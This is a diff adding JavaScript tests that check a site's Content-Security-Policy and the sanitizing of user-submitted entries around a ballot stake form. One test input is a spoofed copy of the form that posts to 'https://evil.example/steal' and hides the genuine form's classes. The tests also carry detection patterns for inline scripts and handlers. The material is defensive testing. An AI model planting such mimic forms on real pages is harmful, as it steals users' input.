@@ -245,3 +245,52 @@ test("built: NO other page carries a policy: the forwarder beside each household
   const withPolicy = others.filter((p) => /http-equiv="?Content-Security-Policy/i.test(fs.readFileSync(p, "utf8"))).map(rel);
   assert.deepEqual(withPolicy, []);
 });
+
+// ── the band hosts POS-502's ballot stake form (POS-984): its script, its look and its reach must pass the policy ──
+// The form is a bundled module (an external 'self' script: no hash, nothing inline), builds its DOM as text, posts with fetch to the office's
+// base (connect-src), and brings its look as a runtime <style> (style-src 'unsafe-inline', which the policy keeps for the sanitizer's own
+// stylesheet). Nothing of it is in the entry's region, and an entry cannot reach it or pass for it.
+
+import { BALLOT_STAKE_CSS } from "../src/lib/ballot-stake.mjs";
+import { fileURLToPath } from "node:url";
+const SITE = path.resolve(fileURLToPath(new URL("..", import.meta.url)));   // path-safe on Windows, unlike ROOT above
+
+test("the stake form fits the policy: the office is a connect-src, the travelling CSS rides style-src 'unsafe-inline', and no code or host outside what the policy allows is in it", () => {
+  const dirs = Object.fromEntries(hearthPolicy([]).split("; ").map((d) => [d.split(" ")[0], d.split(" ").slice(1).join(" ")]));
+  assert.match(dirs["connect-src"], /^'self' https:\/\/postmark\.town\b/, "the form's fetches go to the office's base: this origin, or the office's");
+  assert.match(dirs["style-src"], /'unsafe-inline'/, "the form's look is a runtime <style> (BALLOT_STAKE_CSS), which style-src 'unsafe-inline' allows");
+  assert.equal(dirs["form-action"], "'self'", "the form has no action of its own, and could post nowhere else");
+  assert.ok(!/unsafe-eval/.test(dirs["script-src"]) && !/unsafe-inline/.test(dirs["script-src"]), "and it needs neither eval nor an inline script");
+  for (const f of ["src/lib/ballot-stake.mjs", "src/lib/hearth/band-ballots.mjs"]) {
+    const code = fs.readFileSync(path.join(SITE, f), "utf8").split("\n").filter((l) => !/^\s*\/\//.test(l)).join("\n");
+    assert.ok(!/https?:\/\/(?!postmark\.town)/.test(code.replace(/"https?:\/\/postmark\.town[^"]*"/g, "")), `${f}: it names no host of its own: the office's base comes from auth.mjs`);
+    assert.ok(!/<script|javascript:|\bon[a-z]+\s*=/.test(code), `${f}: no script tag, javascript: URL or inline handler`);
+  }
+  assert.ok(!/url\(|@import|expression\(|javascript:/i.test(BALLOT_STAKE_CSS), "the travelling CSS loads nothing");
+});
+
+test("BUILD INPUT: an entry's markup shaped like the stake form is stripped or namespaced: it cannot place a form, reach the band's section, or take the form's classes", () => {
+  const e = prepareEntry({
+    id: "mimic", title: "m", author: "x", line: "l",
+    html: `<section data-hband-ballots data-hb-stake="hearth-contest" data-hband class="hb-stake bs"><form action="https://evil.example/steal"><input name="stamps"><button class="bs-confirm">Confirm stake</button></form><p>a</p></section>`,
+    css: `.bs { color: red } .bs-confirm, .hb-stake, .hband-ballots { display: none }`,
+  });
+  assert.ok(e.ok);
+  assert.ok(!/<form|<input|<button|data-hband|data-hb-|evil\.example|action=/i.test(e.html), `no form, no input, no hook of the band's: ${e.html}`);
+  assert.ok(!/class="[^"]*(^|[\s"])(bs|bs-confirm|hb-stake)\b/.test(e.html.replace(/u-(bs|bs-confirm|hb-stake)/g, "")), "its classes are namespaced `u-`, so the form's rules (.bs …) never meet them");
+  assert.ok(!/(^|[^-\w])\.(bs|bs-confirm|hb-stake|hband-ballots)\b/.test(e.css.replace(/\.u-(bs|bs-confirm|hb-stake|hband-ballots)/g, "")), "and its stylesheet cannot name the form's classes");
+});
+
+test("built: no household page carries any stake or ballot code inline: it is a bundled 'self' script, and the region holds none of it", { skip: !built }, () => {
+  const slugs = fs.readdirSync(path.join(DIST, "households")).filter((s) => fs.existsSync(path.join(DIST, "households", s, "index.html")));
+  for (const slug of slugs) {
+    const html = fs.readFileSync(path.join(DIST, "households", slug, "index.html"), "utf8");
+    for (const s of inlineScripts(html)) assert.ok(!/stake-vote|pm:ballot-staked|BALLOT_STAKE|mountBallotStake|data-hband-ballots/.test(s.text), `${slug}: an inline script carries the stake code (it must be bundled)`);
+    const region = html.slice(html.indexOf(ENTRY_OPEN), html.indexOf(ENTRY_CLOSE));
+    assert.ok(!/stake-vote|ballot-staked|bs-form|data-hband-ballots/.test(region), `${slug}: nothing of the stake form is in the entry's region`);
+  }
+  const assets = path.join(DIST, "_astro");
+  const files = fs.readdirSync(assets).filter((f) => f.endsWith(".js"));
+  const carrying = files.filter((f) => fs.readFileSync(path.join(assets, f), "utf8").includes("pm:ballot-staked"));
+  assert.ok(carrying.length >= 1, "the stake form is shipped as bundled files under /_astro/ (script-src 'self')");
+});
